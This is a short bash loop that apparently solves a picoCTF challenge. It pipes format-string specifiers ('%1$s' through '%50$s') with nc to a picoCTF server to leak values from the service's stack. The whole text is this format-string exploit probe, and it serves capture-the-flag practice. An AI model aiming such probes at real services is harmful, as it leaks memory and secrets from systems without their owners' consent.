for i in {1..50}; 
do
    (echo 1; echo "%${i}\$s") | nc mercury.picoctf.net 6989
done